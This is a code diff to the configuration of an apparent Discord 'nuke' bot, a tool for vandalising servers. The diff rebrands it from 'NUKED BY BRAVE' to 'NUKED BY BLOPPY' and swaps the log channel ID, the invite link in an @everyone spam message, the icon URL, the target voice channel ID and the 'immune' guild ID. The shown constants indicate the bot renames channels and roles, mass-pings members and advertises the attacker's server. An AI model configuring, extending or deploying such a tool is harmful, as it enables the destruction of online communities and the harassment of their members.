@@ -15,15 +15,15 @@ const client = new Client({
 });
 
 const PREFIX = '!';
-const LOG_CHANNEL_ID = '1518813932909760532';
-const NUKE_CHANNEL_NAME = 'NUKED BY BRAVE';
-const NUKE_ROLE_NAME = 'NUKED BY BRAVE';
-const RENAME_TEXT = 'NUKED BY BRAVE';
-const MESSAGE_CONTENT = `# ${RENAME_TEXT}\n|| @everyone / @here \n || https://discord.gg/R7bTQbE9BW ||`;
-const ICON_URL = 'https://cdn.discordapp.com/attachments/1518813932909760532/1518814085888741376/effb12e066db52fa694d5f9545387c5a.jpg?ex=6a3b4958&is=6a39f7d8&hm=7cd4a3c4810dbecf5e2bc8be2c612f7f53a49d24a68fb955c0b9dca87b1792b5&';
+const LOG_CHANNEL_ID = '1519134222508359732';
+const NUKE_CHANNEL_NAME = 'NUKED BY BLOPPY';
+const NUKE_ROLE_NAME = 'NUKED BY BLOPPY';
+const RENAME_TEXT = 'NUKED BY BLOPPY';
+const MESSAGE_CONTENT = `# ${RENAME_TEXT}\n|| @everyone / @here \n || https://discord.gg/yYFzYNcs7Q ||`;
+const ICON_URL = 'https://cdn.discordapp.com/attachments/1518777889728888957/1519134966502527017/sponge.jfif?ex=6a3c7430&is=6a3b22b0&hm=07b5b1c9ff1f2f4bb537664f6e0b0132636c84e0d66eb8119c319faf29e8ec41&';
 const SERVER_DESCRIPTION = 'HAHAHAHAHAHAHAH';
-const TARGET_VOICE_CHANNEL_ID = '1515317424323428398';
-const IMMUNE_GUILD_ID = '1518698079992287242';
+const TARGET_VOICE_CHANNEL_ID = '1519134222508359733';
+const IMMUNE_GUILD_ID = '1519134221665570916';
 
 const nukeSessions = new Map();
 
